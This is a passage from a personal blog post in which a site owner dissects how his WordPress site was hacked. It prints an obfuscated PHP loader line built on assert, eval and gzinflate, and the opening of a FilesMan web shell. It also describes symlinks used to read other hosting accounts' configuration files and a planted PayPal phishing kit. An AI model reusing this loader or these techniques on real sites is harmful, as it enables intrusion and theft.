</code></pre><p>So what does it do? Well, the first part basically just assembles <code>q</code> with the value&nbsp;“assert”. </p>
<pre><code><span style='display:none' detected-language='cs'></span><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">assert</span> <span class="hljs-params">( mixed $assertion [, <span class="hljs-keyword">string</span> $description ] )</span></span>
</code></pre><p>When <span class="caps">PHP</span>’s built-in assert function is passed a string <code>$assertion</code>, it evaluates that string. It’s less known than <code>eval</code> so this is plausibly useful for evading firewalls of a certain sort. So what it finally translates to&nbsp;is:</p>
<pre><code><span style='display:none' detected-language='bash'></span>assert(<span class="hljs-string">"eval('eval(gzinflate(base64_decode(<span class="hljs-variable">$v</span>)));');"</span>)
</code></pre><p>The decoded file starts out like&nbsp;this:</p>
<pre><code><span style='display:none' detected-language='handlebars'></span><span class="xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
<span class="hljs-variable">$auth_pass</span> = <span class="hljs-string">"cef26cef9c9fdbdb49363368c8921635"</span>;
<span class="hljs-variable">$color</span> = <span class="hljs-string">"#df5"</span>;
<span class="hljs-variable">$default_action</span> = <span class="hljs-string">'FilesMan'</span>;
<span class="hljs-variable">$default_use_ajax</span> = <span class="hljs-keyword">true</span>;
<span class="hljs-variable">$default_charset</span> = <span class="hljs-string">'Windows-1251'</span>;</span></span>
</code></pre><p>I searched around for the password, but nobody’s yet been able to find a matching plaintext. However, along the way I found out about <a href="http://ddecode.com/phpdecoder/">PHPDecoder</a> which would have saved quite a bit of time an hour&nbsp;ago.</p>
<p>This one is also 1500 lines, so I’ve posted it in another <a href="https://gist.github.com/antimatter15/a2375e36f0f04dc6b3fb">Gist</a>. This one looks aesthetically a bit nicer— if it’s not too weird to complement the tools of the people who hacked your&nbsp;website. </p>
<p><div class="pic md" style="" ><img alt="WebShell"  src="/articles/2014/Getting%20Hacked/xstyles.png" ></div></p>
<hr>
<p>There’s one (hah, pun not intended) folder entitled <code>1/</code> which is particularly interesting. It has three subdirectories: <code>configweb</code>, <code>sym</code>, and <code>tumdizin</code>.</p>
<p>Configweb seems to be a directory filled with symlinks to 9414 distinct configuration files, each of them residing on someone else’s home directory. It encompasses lots of different software packages including Joomla, Wordpress, Zencart, <span class="caps">SMF</span>, WHM, OSCommerce, VBulletin and&nbsp;ore. </p>
<p>The directory <code>sym</code> seems to just contain a symlink entitled <code>root</code> to— you guessed it— <code>/</code>. </p>
<p>And finally <code>tumdizin</code> seems to link to the web roots of 116 distinct shared hosting accounts which happen to reside on the same&nbsp;server.</p>
<hr>
<p>There’s also that folders which blow up in the tree <code>x4MslaR1CW</code>, and <code>ptRiJiayze</code>. You can probably guess by files like <code>logo_paypal_106x29.png</code> that this site got turned essentially into a phishing website for Paypal. I’m actually rather amazed that the result looks so&nbsp;plausible. </p>
<p><div class="pic md" style="" ><img alt=""  src="/articles/2014/Getting%20Hacked/paypal.png" ></div></p>
<hr>
<p>However, it seems that there was some weird activity going on starting a few days before the massive traffic. There’s an <code>error_log</code> file which seems to grow pretty slowly in general. There was a fairly large stretch from January to June with no errors— and then it seemed to constantly encounter these errors leading up to the traffic&nbsp;spike. </p>
<pre><code><span style='display:none' detected-language='groovy'></span>[<span class="hljs-number">03</span>-Jun-<span class="hljs-number">2014</span> <span class="hljs-number">17</span>:<span class="hljs-number">06</span>:<span class="hljs-number">05</span> <span class="caps">UTC</span>] PHP <span class="hljs-string">Warning:</span>  Cannot modify header information - headers already sent by (output started at <span class="hljs-regexp">/home/</span>antimatt<span class="hljs-regexp">/public_html/</span>wp<span class="hljs-regexp">/wp-rss.php(1) : eval()'d code:1) in /</span>home<span class="hljs-regexp">/antimatt/</span>public_html<span class="hljs-regexp">/wp/</span>wp-includes/pluggable.php on line <span class="hljs-number">1121</span>
[<span class="hljs-number">04</span>-Jun-<span class="hljs-number">2014</span> <span class="hljs-number">19</span>:<span class="hljs-number">31</span>:<span class="hljs-number">54</span> <span class="caps">UTC</span>] PHP <span class="hljs-string">Warning:</span>  include(images<span class="hljs-regexp">/settings.php): failed to open stream: No such file or directory in /</span>home<span class="hljs-regexp">/antimatt/</span>public_html<span class="hljs-regexp">/wp/</span>wp-content<span class="hljs-regexp">/themes/</span>carrington-woot/footer.php on line <span class="hljs-number">24</span>
[<span class="hljs-number">04</span>-Jun-<span class="hljs-number">2014</span> <span class="hljs-number">19</span>:<span class="hljs-number">31</span>:<span class="hljs-number">54</span> <span class="caps">UTC</span>] PHP <span class="hljs-string">Warning:</span>  include(images<span class="hljs-regexp">/settings.php): failed to open stream: No such file or directory in /</span>home<span class="hljs-regexp">/antimatt/</span>public_html<span class="hljs-regexp">/wp/</span>wp-content<span class="hljs-regexp">/themes/</span>carrington-woot/footer.php on line <span class="hljs-number">24</span>
</code></pre><hr>
<p>I ended up downloading a daily backup of the server which was taken before it was hacked (June 1, 2014) and installing it onto a small virtual machine. I downloaded a Wordpress plugin for exporting the entire website as static <span class="caps">HTML</span> pages and uploaded it to Github pages. This served as a stop-gap measure for almost an entire year while I was getting the new site to&nbsp;work.</p>
<p>This experience is largely why I decided that this new incarnation would be a static site— essentially free from the perils that come with a dynamic website. It’s not like the old version used dynamic content to much advantage anyway, it was cached enough that it was practically static&nbsp;anyway. </p>

            </section>
          </article>
          <hr>
          <div class="nav"><a href="/archive" class="newer">« Archives</a><a href="/page/1" class="next">Latest Posts »</a></div>
        </div>
      </div>
    </div>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      
      ga('create', 'UA-1367972-3', 'auto');
      ga('send', 'pageview');
      
    </script>
    <script>
      function squish(){
        document.getElementById("squishfoot").className += "squish"
      }
    </script>
    <style>
      .squish { font-size: 9px }
      .squishsquish { font-size: 8px }
      .squishsquishsquish { font-size: 7px }
      .squishsquishsquishsquish { font-size: 6px }
      .squishsquishsquishsquishsquish { font-size: 5px }
      .squishsquishsquishsquishsquishsquish { font-size: 4px }
      .squishsquishsquishsquishsquishsquishsquish { visibility: hidden }
      .squishsquishsquishsquishsquishsquishsquish-with-some-good-css-by-omrelliug { }
    </style>
    <div class="graybar bottom">
      <footer>
        <div id="squishfoot">I'm a tiny footer, please don't <a href="javascript:squish()">squish</a> me</div>
      </footer>
    </div>
  </body>
</html>